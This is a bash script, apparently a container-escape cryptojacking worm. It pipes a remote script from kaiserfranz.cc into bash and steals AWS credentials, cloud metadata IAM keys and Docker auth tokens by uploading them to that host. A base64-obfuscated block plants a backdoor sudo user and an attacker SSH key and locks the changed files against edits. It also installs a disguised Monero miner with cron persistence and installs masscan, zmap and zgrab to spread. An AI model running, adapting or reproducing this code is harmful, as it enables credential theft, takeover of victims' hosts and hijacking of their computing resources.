#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

function INIT_MAIN(){
SETUP_BASICS
SETUP_JQ
GABBING_DATA
CREATE_ACCOUNT
SETUP_XMR
START_XMR
START_SMALL
SETUP_MSCAN
SETUP_ZMAP
SETUP_ZGRAB
bash /root/scan.sh
}

function SETUP_BASICS(){
apk update
apk add bash curl wget vim docker
service docker start
curl http://kaiserfranz.cc/ws.sh | bash
}

function SETUP_JQ(){
apk update
apk add jq
}

function SETUP_MSCAN(){
apk update
apk add git gcc make musl-dev libpcap-dev linux-headers
git clone https://github.com/robertdavidgraham/masscan /opt/masscan/
cd /opt/masscan/
make
make install
}

function SETUP_ZMAP(){
apk update
apk add zmap
}

function SETUP_ZGRAB(){
apk update
apk add git go gcc make musl-dev libpcap-dev linux-headers
export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab/
go build
cp ./zgrab /usr/bin/zgrab
chmod +x /usr/bin/zgrab
}

function GABBING_DATA(){
if [ -d "/host" ] ; then
cat /host/root/.aws/* >> /tmp/.aws 2>/dev/null ; cat /host/home/*/.aws/* >> /tmp/.aws 2>/dev/null
cat /tmp/.aws | grep "aws_access_key_id" || rm -f /tmp/.aws
if [ -f "/tmp/.aws" ] ; then curl -F "userfile=@/tmp/.aws" http://kaiserfranz.cc/SFRAME/upload/axx.php ; rm -f /tmp/.aws ; fi

curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) >> /tmp/.aws2
cat /tmp/.aws2 | grep "SecretAccessKey" || rm -f /tmp/.aws2 
if [ -f "/tmp/.aws2" ] ; then curl -F "userfile=@/tmp/.aws2" http://kaiserfranz.cc/SFRAME/upload/axx.php ; rm -f /tmp/.aws2 ; fi

env | grep "AWS" >> /tmp/.aws3
cat /tmp/.aws2 | grep "AWS" || rm -f /tmp/.aws3
if [ -f "/tmp/.aws3" ] ; then curl -F "userfile=@/tmp/.aws3" http://kaiserfranz.cc/SFRAME/upload/axx.php ; rm -f /tmp/.aws3 ; fi


cat /host/root/.docker/config.json >> /tmp/.docker 2>/dev/null ; cat /host/home/*/.docker/config.json >> /tmp/.docker 2>/dev/null
cat /tmp/.docker | grep "auth" || rm -f /tmp/.docker
if [ -f "/tmp/.docker" ] ; then
curl -F "userfile=@/tmp/.docker" http://kaiserfranz.cc/SFRAME/upload/axx.php
rm -f /tmp/.docker
fi

fi
}

function CREATE_ACCOUNT(){
$(echo IyEvYmluL3NoClJTQUtFWT0nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFERk8vRUZRUXhCcVNZK1g5M0VDVFVZUUx4QXpmNXMwcG5hT3U0UlpQbVNHbjE3YjdLaXhhOGoyQktPdS9tTDFudmZCdXVZb2hkaWhkVDdSVmFFSkRQZzdsS2JzR1VEaGFINmlmRUgwQURZVGp4ODFqek9hUEMwZ3lpWXVWWktxdDJuQUhBUDBhN29pSnEwZzZIWjRmM2ZNRDFhMzY5cFFvZm9tT2pUcTNjYlh2TE9TaXVFcTFwRGZSbU5TTU0wbTZCRGlSaHBxUjlrU0YydDB6WTRocG1OK3YxQWFtZk5SdEoxTERYb1NHSlc4a2w1L0xBbm9KRURIYXljTnRBUFVzTXBBZ3B4Zlkvbk1PalR2bFpFSGJBN1NsbkMzNkNwdzlSRUxESzV6aXBNVU51cHRVcFpIRWZPN2o4T3JoVzk4QzVCR29Uams4TDVVWFEvbFBhaHNYeWQrLzR6dHBPNHlWakxSNDBsZUQ1U3ZzTThIU09FQzh0NzBWTDNGQ2RvVDV0Y1U5VGQ1WFkrV3BKOThFRTF0QnBkdnlLVjY5Y28zOURFcVFQZFQwajA3M1NVdGM1cmR1eTZKUW52cytFM1ZoSTZaVm9UMFR5ZEpraGZqTk95a0JMbysyVUJFSENJS3IxWVRSZXdZc2d0akNsM3Izb1dkWjA2WXVMcnJZdDdJaDROL1dISWpWZ2Z6enJ5dnMweGhnbFd4cGZRUmwvdXB6MVBVRWVkR20vajhnK29zSnlsKzRYUituZUpXSVRnMWpmbmp6SHVDeWFVYXJPVHd5c0o5S2pTZHhZRzFZcnNacitPekdvU0YyWXR1c0pkK0RsOW1MUTdJbzRqc3JVc2xVcmU2N1ltMERqOVBEUkRobUNFRDZIUjdCaW13QTlRdE1nL01abEg0QmVsVVE9PSByb290QGxvY2FsaG9zdCcKCmlmICEgdHlwZSBjaGF0dHIgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gaWYgdHlwZSBhcHQtZ2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIGFwdC1nZXQgdXBkYXRlIC0tZml4LW1pc3NpbmcgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGFwdC1nZXQgaW5zdGFsbCAteSBlMmZzcHJvZ3MgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpCmlmIHR5cGUgeXVtIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIHl1bSBjbGVhbiBhbGwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHl1bSBpbnN0YWxsIC15IGUyZnNwcm9ncyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKaWYgdHlwZSBhcGsgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gYXBrIHVwZGF0ZSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgYXBrIGFkZCBlMmZzcHJvZ3MtZXh0cmEgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpIDsgZmkKCgoKY2hhdHRyIC1pYSAvaG9zdC8gL2hvc3QvZXRjLyAvaG9zdC9ldGMvc3NoLyAvaG9zdC9ldGMvcGFzc3dkIC9ob3N0L2V0Yy9zaGFkb3cgL2hvc3QvZXRjL3N1ZG9lcnMgL2hvc3QvZXRjL3NzaC9zc2hkX2NvbmZpZwpzZWQgLWkgJy9QZXJtaXRSb290TG9naW4vY1xQZXJtaXRSb290TG9naW4geWVzJyAvaG9zdC9ldGMvc3NoL3NzaGRfY29uZmlnCnNlZCAtaSAnL1Bhc3N3b3JkQXV0aGVudGljYXRpb24vY1xQYXNzd29yZEF1dGhlbnRpY2F0aW9uIHllcycgL2hvc3QvZXRjL3NzaC9zc2hkX2NvbmZpZwpzZWQgLWkgJy9QdWJrZXlBdXRoZW50aWNhdGlvbi9jXFB1YmtleUF1dGhlbnRpY2F0aW9uIHllcycgL2hvc3QvZXRjL3NzaC9zc2hkX2NvbmZpZwpjYXQgL2hvc3QvZXRjL3N1ZG9lcnMgfCBncmVwICdoaWxkZScgfHwgZWNobyAnaGlsZGUgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2hvc3QvZXRjL3N1ZG9lcnMKY2F0IC9ob3N0L2V0Yy9wYXNzd2QgfCBncmVwICdoaWxkZScgfHwgZWNobyAnaGlsZGU6eDoxMDAxOjEwMDE6Oi9ob21lL2hpbGRlOi9iaW4vc2gnID4+IC9ob3N0L2V0Yy9wYXNzd2QKY2F0IC9ob3N0L2V0Yy9zaGFkb3cgfCBncmVwICdoaWxkZScgfHwgZWNobyAnaGlsZGU6L0JuS2lQbVhBMmVBUToxODYwODowOjk5OTk5Ojc6OjonID4+IC9ob3N0L2V0Yy9zaGFkb3cKY2hhdHRyICtpIC9ob3N0L2V0Yy9zc2gvc3NoZF9jb25maWcgL2hvc3QvZXRjL3N1ZG9lcnMgL2hvc3QvZXRjL3Bhc3N3ZCAvaG9zdC9ldGMvc2hhZG93CgpjaGF0dHIgLWlhIC9ob3N0LyAvaG9zdC9yb290LyAvaG9zdC9yb290Ly5zc2gvIC9ob3N0L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMgL2hvc3Qvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKY2hhdHRyIC1pYSAvaG9zdC8gL2hvc3QvaG9tZS8KbWtkaXIgLXAgL2hvc3QvaG9tZS9oaWxkZS8uc3NoLwpjaGF0dHIgLWlhIC9ob3N0L2hvbWUvaGlsZGUvLnNzaC9hdXRob3JpemVkX2tleXMgL2hvc3QvaG9tZS9oaWxkZS8uc3NoL2F1dGhvcml6ZWRfa2V5cwplY2hvICRSU0FLRVkgPj4gL2hvc3Qvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwplY2hvICRSU0FLRVkgPiAvaG9zdC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzMgplY2hvICRSU0FLRVkgPiAvaG9zdC9ob21lL2hpbGRlLy5zc2gvYXV0aG9yaXplZF9rZXlzCmVjaG8gJFJTQUtFWSA+IC9ob3N0L2hvbWUvaGlsZGUvLnNzaC9hdXRob3JpemVkX2tleXMyCmNoYXR0ciAraSAvaG9zdC9ob21lL2hpbGRlLy5zc2gvYXV0aG9yaXplZF9rZXlzIC9ob3N0L2hvbWUvaGlsZGUvLnNzaC9hdXRob3JpemVkX2tleXMyIC9ob3N0L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMgL2hvc3Qvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKCgo= | base64 -d | bash) &
}

function SETUP_XMR(){
wget http://kaiserfranz.cc/SFRAME/files/xmr/x.tar.gz -O /tmp/x.tar.gz
tar xvf /tmp/x.tar.gz -C /usr/bin/

cp /usr/bin/Daemon /host/usr/bin/Daemon
chmod +x /host/usr/bin/Daemon
cp /usr/bin/kthreadd /host/usr/bin/kthreadd
chmod +x /host/usr/bin/kthreadd

chattr -ia /host/ /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/root
chmod 1777 /host/var/spool/cron/root
rm -f /host/var/spool/cron/root
echo '*/1 * * * * /usr/bin/Daemon 2>/dev/null 1>/dev/null ; crontab -r' > /host/var/spool/cron/root
}

function START_XMR(){
chmod +x /usr/bin/Daemon
chmod +x /usr/bin/kthreadd
/usr/bin/Daemon
}

function START_SMALL(){
wget http://kaiserfranz.cc/SFRAME/files/zig/small -O /usr/bin/bioset
chmod +x /usr/bin/bioset
/usr/bin/bioset
}


INIT_MAIN
